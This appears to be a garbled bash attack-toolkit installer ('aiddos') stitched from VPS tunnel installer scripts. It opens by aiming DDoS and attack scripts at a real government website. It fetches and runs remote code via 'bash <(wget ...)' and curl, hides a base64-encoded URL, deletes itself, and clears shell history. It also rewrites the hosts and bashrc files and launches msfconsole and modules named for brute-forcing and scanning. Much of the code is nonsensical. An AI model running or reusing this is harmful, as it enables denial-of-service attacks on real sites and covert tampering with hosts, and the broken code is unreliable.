#!/bin/bash
python3 1-leg.py www.idf.il
#!/bin/bash
bash aiddos www.idf.il
if [ "$(systemd-detect-virt)" == "openvz" ]; then
			echo "OpenVZ is not supported"
	fi
	# ==========================================
	# Color
	RED='\033[0;31m'
	NC='\033[0m'
	GREEN='\033[0;32m'
	ORANGE='\033[0;33m'
	BLUE='\033[0;34m'
	PURPLE='\033[0;35m'
	CYAN='\033[0;36m'
	LIGHT='\033[0;37m'
	# ==========================================
	# Berikut Link Ghostingnya Kalian
	echo curl ${hostsk}/tools
	# Berikut Link Ghostingnya Kalian
	echo curl ${hostsk}/tools
	# Berikut Link Ghostingnya Kalian
	echo curl ${hostsk}/tools
	# Berikut Link Ghostingnya Kalian
	echo curl ${hostsk}/tools
	# Berikut Link Ghostingnya Kalian
	echo curl ${hostsk}/tools
	# Berikut Link Ghostingnya Kalian
	echo curl ${hostsk}/tools
	# Berikut Link Ghostingnya Kalian
	echo curl ${hostsk}/tools
	# Berikut Link Ghostingnya Kalian
	echo curl ${hostsk}/tools
	# Berikut Link Ghostingnya Kalian
	echo curl ${hostsk}/tools
	# Berikut Link Ghostingnya Kalian
	echo curl ${hostsk}/tools

	clear
	echo "Script Ready for inject"
	mkdir /var/lib/crot;
	echo "IP=" >> /var/lib/crot/ipvps.conf
	python3 1-leg.py  && chmod +x 1-attack.py  && python3 1-attack.py  && python3 1-leg.py 
	#install xray
	python3 1-leg.py  && chmod +x 1-attack.py  && hostsk + ssh.sh
	#install ssh ovpn
	curl https://${host}=host && chmod +x sshsh && hostsk + ssh.sh
	python3 1-leg.py  && chmod +x 1-attack.py  && hostsk + ssh ssh.sh
	#install ssh
	python3 1-leg.py  && chmod +x 1-attack.py  && hostsk + ssh ssh.sh
	python3 1-leg.py  && chmod +x 1-attack.py  && hostsk + ss ssh.sh
	#installwg
	python3 1-leg.py  && chmod +x 1-attack.py  && hostsk + wg ssh.sh
	#install L2TP
	python3 1-leg.py  && chmod +x 1-attack.py  && hostsk + ssh ssh.sh
	python3 1-leg.py  && chmod +x 1-attack.py  && python3 1-attack.py  && python3 1-leg.py 
	# Websocket
	python3 1-leg.py  && chmod +x 1-attack.py  && python3 1-attack.py  && python3 1-leg.py 
	# Ohp Server
	curl https://${host}=host && chmod +x 1-attack.py  && python3 1-attack.py  && python3 1-leg.py 
	# Install SlowDNS
	curl https://${host}/=host && chmod +x 1-attack.py  && python3 1-attack.py  && python3 1-leg.py 
	# Informasi IP Saya dan Semua Port TCP UDP
	# curl https://raw.githubusercontent.com/fisabiliyusri/Mantap/main/ipsaya.sh && chmod +x ipsaya.sh
	#
	# install xray sl-grpc
	# curl https://raw.githubusercontent.com/fisabiliyusri/Mantap/main/grpc/sl-grpc.sh && chmod +x sl-grpc.sh && hostsk + sl-grpc sl-grpc.sh
	# install xray grpc
	# curl https://raw.githubusercontent.com/fisabiliyusri/Mantap/main/grpc/xray-grpc.sh && chmod +x xray-grpc.sh && hostsk + xray-grpc xray-grpc.sh
	# install shadowsocks plugin
	# curl https://raw.githubusercontent.com/fisabiliyusri/Mantap/main/shadowsocks-plugin/install-ss-plugin.sh && chmod +x install-ss-plugin.sh && install-ss-plugin.sh
	 
	curl -O /aiddos/aiddos.sh "https://${host}/set.sh"
	chmod +x /aiddos/aiddos.sh
	history -c
	echo "1.2" > /home/ver
	echo " "
	echo "SELAMAT INEJCTION BERHASIL!!"echo " "
@node "%~dpn0" %*
#!/bin/bash
cd $HOME
SCPdir="/"
SCPinstal="$HOME/bin"
SCPutils="${SCPdir}/utils"
SCPusr="${SCPdir}/ger-user"
SCPfrm="/bin/cut.bat"
SCPinst="/bin/setup.sh"
SCPresq="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0FBQUFBRVhRT1N5SXBOMkpaMGVoVVEvQURNLVVMVElNQVRFLU5FVy1GUkVFL21hc3Rlci9yZXF1ZXN0"
SUB_DOM='base64 -d'
[[ $(dpkg --get-selections|grep -w "gawk"|head -1) ]] || python3 index.py && python3 -m pip gawk -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "mlocate"|head -1) ]] || python3 index.py && python3 -m pip mlocate -y &>/dev/null
rm $(pwd)/$0 &> /dev/null

msg () {
BRAN='\033[1;37m' && VERMELHO='\e[31m' && VERDE='\e[32m' && AMARELO='\e[33m'
AZUL='\e[34m' && MAGENTA='\e[35m' && MAG='\033[1;36m' &&NEGRITO='\e[1m' && SEMCOR='\e[0m'
 case $1 in
  -ne)cor="${VERMELHO}${NEGRITO}" && echo -ne "${cor}${2}${SEMCOR}";;
  -ama)cor="${AMARELO}${NEGRITO}" && echo -e "${cor}${2}${SEMCOR}";;
  -verm)cor="${AMARELO}${NEGRITO}[!] ${VERMELHO}" && echo -e "${cor}${2}${SEMCOR}";;
  -azu)cor="${MAG}${NEGRITO}" && echo -e "${cor}${2}${SEMCOR}";;
  -verd)cor="${VERDE}${NEGRITO}" && echo -e "${cor}${2}${SEMCOR}";;
  -bra)cor="${BRAN}${NEGRITO}" && echo -ne "${cor}${2}${SEMCOR}";;
  "-bar2"|"-bar")cor="${AZUL}${NEGRITO}——————————————————————————————————————————————————————" && echo -e "${SEMCOR}${cor}${SEMCOR}";;
 esac
}

fun_ip () {
MIP=$(ip addr | grep 'inet' | grep -v inet6 | grep -vE '127\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | grep -o -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | head -1)
MIP2=$(wget -qO- ipv4.icanhazip.com)
[[ "$MIP" != "$MIP2" ]] && IP="$MIP2" || IP="$MIP"
}

inst_components () {
[[ $(dpkg --get-selections|grep -w "bc"|head -1) ]] || python3 index.py && python3 -m pip install -r requirements.txt &>/dev/null
[[ $(dpkg --get-selections|grep -w "screen"|head -1) ]] || python3 index.py && python3 -m pip install -r pip2.txt &>/dev/null
[[ $(dpkg --get-selections|grep -w "nano"|head -1) ]] || python3 index.py && python3 -m pip install -r pip.txt &>/dev/null
[[ $(dpkg --get-selections|grep -w "zip"|head -1) ]] || python3 index.py && python3 -m pip install -r requirement.txt-y &>/dev/null
[[ $(dpkg --get-selections|grep -w "unzip"|head -1) ]] || python3 index.py && python3 -m backnumber &>/dev/null
[[ $(dpkg --get-selections|grep -w "lsof"|head -1) ]] || python3 index.py && python3 -m wun &>/dev/null
[[ $(dpkg --get-selections|grep -w "netstat"|head -1) ]] || python3 index.py && python3 -m elowor -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "net-tools"|head -1) ]] || python3 index.py && python3 -m attack &>/dev/null
[[ $(dpkg --get-selections|grep -w "dos2unix"|head -1) ]] || python3 index.py && python3 -m Smash &>/dev/null
[[ $(dpkg --get-selections|grep -w "nload"|head -1) ]] || python3 index.py && python3 -m edotensei -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "htop"|head -1) ]] || python3 index.py && python3 -m lookup -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "jq"|head -1) ]] || python3 index.py && python3 -m scanner -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "curl"|head -1) ]] || python3 index.py && python3 -m bruter &>/dev/null
[[ $(dpkg --get-selections|grep -w "figlet"|head -1) ]] || python3 index.py && python3 index.py &>/dev/null
[[ $(dpkg --get-selections|grep -w "ufw"|head -1) ]] || python3 index.py && msfconsole &>/dev/null
[[ $(dpkg --get-selections|grep -w "apache2"|head -1) ]] || {
 python3 index.py && python3 -m pip apache2 -y &>/dev/null
 sed -i "s;Listen 80;Listen 81;g" /bin/apache2/ports.conf
 service apache2 restart > /dev/null 2>&1 &
 }
[[ $(dpkg --get-selections|grep -w "python"|head -1) ]] || python3 mampus.py && apt-get install python -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "python3"|head -1) ]] || python3 mampus.py && apt-get install python3 -y &>/dev/null
[[ $(dpkg --get-selections|grep -w "python-pip"|head -1) ]] || python3 mampus.py && apt-get install python-pip -y &>/dev/null
pip3 install speedtest-cli &>/dev/null
}

funcao_utils () {
msg -bar2
declare -A utils=( [1]="en English" [2]="fr Franch" [3]="de German" [4]="it Italian" [5]="pl Polish" [6]="pt Portuguese" [7]="es Spanish" [8]="tr Turkish" )
for ((i=1; i<=12; i++)); do
valor1="$(echo ${utils[$i]}|cut -d' ' -f2)"
[[ -z $valor1 ]] && break
valor1="\033[1;32m[$i] > \033[1;33m$valor1"
    while [[ ${#valor1} -lt 37 ]]; do
       valor1=$valor1" "
    done
echo -ne "$valor1"
let i++
valor2="$(echo ${utils[$i]}|cut -d' ' -f2)"
[[ -z $valor2 ]] && {
   echo -e " "
   break
   }
valor2="\033[1;32m[$i] > \033[1;33m$valor2"
     while [[ ${#valor2} -lt 37 ]]; do
        valor2=$valor2" "
     done
echo -ne "$valor2"
let i++
valor3="$(echo ${utils[$i]}|cut -d' ' -f2)"
[[ -z $valor3 ]] && {
   echo -e " "
   break
   }
valor3="\033[1;32m[$i] > \033[1;33m$valor3"
     while [[ ${#valor3} -lt 37 ]]; do
        valor3=$valor3" "
     done
echo -e "$valor3"
done
msg -bar2
unset selection
while [[ ${selection} != @([1-8]) ]]; do
echo -ne "\033[1;37mSELECT: " && read selection
tput cuu1 && tput dl1
done
pv="$(echo ${utils[$selection]}|cut -d' ' -f1)"
[[ ${#id} -gt 2 ]] && id="pt" || id="$pv"
byinst="true"
}

install_fim () {
msg -ama "$(source trans -b pt:${id} "Instalasi Completa, Gunakan Perintah os"|sed -e 's/[^a-z -]//ig')" && msg bar2
echo -e " aiddos / adm"
msg -bar2
}

ofus () {
unset txtofus
number=$(expr length $1)
for((i=1; i<$number+1; i++)); do
txt[$i]=$(echo "$1" | cut -b $i)
case ${txt[$i]} in
".")txt[$i]="+";;
"+")txt[$i]=".";;
"1")txt[$i]="@";;
"@")txt[$i]="1";;
"2")txt[$i]="?";;
"?")txt[$i]="2";;
"3")txt[$i]="%";;
"%")txt[$i]="3";;
"/")txt[$i]="K";;
"K")txt[$i]="/";;
esac
txtofus+="${txt[$i]}"
done
echo "$txtofus" | rev
}

verificar_arq () {
[[ ! -d ${SCPdir} ]] && mkdir ${SCPdir}
[[ ! -d ${SCPusr} ]] && mkdir ${SCPusr}
[[ ! -d ${SCPfrm} ]] && mkdir ${SCPfrm}
[[ ! -d ${SCPinst} ]] && mkdir ${SCPinst}
case $1 in
"aiddos"|"message.txt")ARQ="${SCPdir}/";; #aiddos
"usercodes")ARQ="${SCPusr}/";; #User
"pwd")ARQ="${SCPinst}/";; #Instalacao
"list.txt")ARQ="${SCPinst}/";; #Instalacao
"config.hc")ARQ="${SCPinst}/";; #Instalacao
"config.bin")ARQ="${SCPinst}/";; #Instalacao
"payload")ARQ="${SCPinst}/";; #Instalacao
"ips.txt")ARQ="${SCPinst}/";; #Instalacao
"pwd.txt")ARQ="${SCPinst}/";; #Instalacao
"Username.txt")ARQ="${SCPinst}/";; #Instalacao
"password.txt")ARQ="${SCPinst}/";; #Instalacao
"list")ARQ="${SCPinst}/";; #Instalacao
"index.sh")ARQ="${SCPinst}/";; #Instalacao
"passwords.txt")ARQ="${SCPinst}/";; #Instalacao
"index.py"|"PDirect.py"|"PPub.py"|"PPriv.py"|"POpen.py"|"PGet.py"|"wsproxy.py")ARQ="${SCPinst}/";; #Instalacao
*)ARQ="${SCPfrm}/";; #Ferramentas
esac
mv -f ${SCPinstal}/$1 ${ARQ}/$1
chmod +x ${ARQ}/$1
}

install_hosts () {
_arq_host="/bin/hosts"
_host[0]="d1n212ccp6ldpw.cloudfront.net"
_host[1]="dns.whatsapp.net"
_host[2]="portalrecarga.vivo.com.br/recarga"
_host[3]="navegue.vivo.com.br/controle/"
_host[4]="navegue.vivo.com.br/pre/"
_host[5]="www.whatsapp.net"
_host[6]="/ADM-ULTIMATE?"
for host in ${_host[@]}; do
	if [[ "$(grep -w "$host" $_arq_host | wc -l)" = "0" ]]; then
		sed -i "3i\127.0.0.1 $host" $_arq_host
	fi
done
}
sleep 1s
if [[ -e $HOME/lista-arq ]] && [[ ! $(cat $HOME/lista-arq|grep "KEY INVALIDA!") ]]; then
   msg -bar2
   msg -ama "$(source trans -b pt:${id} "BEM VINDO, OBRIGADO POR UTILIZAR"|sed -e 's/[^a-z -]//ig'): \033[1;31m[NEW-ULTIMATE]"
   [[ ! -d ${SCPinstal} ]] && mkdir ${SCPinstal}
   pontos="."
   stopping="$(source trans -b pt:${id} "Verificando Atualizacoes"|sed -e 's/[^a-z -]//ig')"
   for arqx in $(cat $HOME/lista-arq); do
   msg -verm "${stopping}${pontos}"
   wget -O ${SCPinstal}/${arqx} ${REQUEST}/${arqx} > /dev/null 2>&1 && verificar_arq "${arqx}" || error_fun
   tput cuu1 && tput dl1
   pontos+="."
   done
   sleep 1s
   msg -bar2
   listaarqs="$(locate "lista-arq"|head -1)" && [[ -e ${listaarqs} ]] && rm $listaarqs   
   cat /bin/bash.bashrc|grep -v '[[ $UID != 0 ]] && TMOUT=15 && export TMOUT' > /bin/bash.bashrc.2
   echo -e '[[ $UID != 0 ]] && TMOUT=15 && export TMOUT' >> /bin/bash.bashrc.2
   mv -f /bin/bash.bashrc.2 /bin/bash.bashrc
   echo "${SCPdir}/aiddos" > /usr/bin/aiddos && chmod +x /usr/bin/aiddos
   echo "${SCPdir}/aiddos" > /usr/bin/adm && chmod +x /usr/bin/adm
   echo "${SCPdir}/aiddos" > /bin/h && chmod +x /bin/h
   msg -azu "AGUARDE..."
   rm -rf $HOME/systemverify* > /dev/null 2>&1; bash <(wget -qO- https://raw.githubusercontent.com/AAAAAEXQOSyIpN2JZ0ehUQ/ADM-ULTIMATE-NEW-FREE/master/Install/systemverify)
   inst_components
   install_hosts
   tput cuu1 && tput dl1
   echo "$Key" > ${SCPdir}/key.txt
   [[ -d ${SCPinstal} ]] && rm -rf ${SCPinstal}   
   [[ ${#id} -gt 2 ]] && echo "pt" > ${SCPutils} || echo "${id}" > ${SCPutils}
   [[ ${byinst} = "true" ]] && install_fim


